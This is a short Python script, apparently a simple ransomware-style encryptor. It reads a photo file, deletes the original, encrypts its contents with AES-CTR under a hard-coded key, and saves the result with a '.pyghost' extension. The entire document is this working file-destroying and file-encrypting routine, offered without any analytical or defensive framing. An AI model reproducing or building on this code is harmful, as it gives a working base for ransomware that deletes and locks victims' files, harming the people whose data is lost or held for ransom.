import os
import pyaes

#open files
file_name = "foto.jpg"
file = open(file_name, "rb")
file_data = file.read()
file.close()

#for removed files
os.remove(file_name)


#key for cription
key = b"uvNk2dMl6wqGN7xq17KmtmK8wgBAjewk" 
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)


new_file_name = file_name + ".pyghost"
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()
print('Successfully encrypted file')